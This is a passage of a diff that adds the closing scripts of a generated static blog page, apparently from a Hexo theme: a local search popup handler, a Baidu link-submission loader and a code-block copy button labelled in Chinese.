+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script>
+  $('.highlight').not('.gist .highlight').each(function(i, e) {
+    var $wrap = $('<div>').addClass('highlight-wrap');
+    $(e).after($wrap);
+    $wrap.append($('<button>').addClass('copy-btn').append('复制').on('click', function(e) {
+      var code = $(this).parent().find('.code').find('.line').map(function(i, e) {
+        return $(e).text();
+      }).toArray().join('\n');
+      var ta = document.createElement('textarea');
+      var yPosition = window.pageYOffset || document.documentElement.scrollTop;
+      ta.style.top = yPosition + 'px'; // Prevent page scroll
+      ta.style.position = 'absolute';
+      ta.style.opacity = '0';
+      ta.readOnly = true;
+      ta.value = code;
+      document.body.appendChild(ta);
+      const selection = document.getSelection();
+      const selected = selection.rangeCount > 0 ? selection.getRangeAt(0) : false;
+      ta.select();
+      ta.setSelectionRange(0, code.length);
+      ta.readOnly = false;
+      var result = document.execCommand('copy');
+      
+        if (result) $(this).text('复制成功');
+        else $(this).text('复制失败');
+      
+      ta.blur(); // For iOS
+      $(this).blur();
+      if (selected) {
+        selection.removeAllRanges();
+        selection.addRange(selected);
+      }
+    })).on('mouseleave', function(e) {
+      var $b = $(this).find('.copy-btn');
+      setTimeout(function() {
+        $b.text('复制');
+      }, 300);
+    }).append(e);
+  })
+</script>
+
+
+  
+
+  
+
+</body>
+</html>
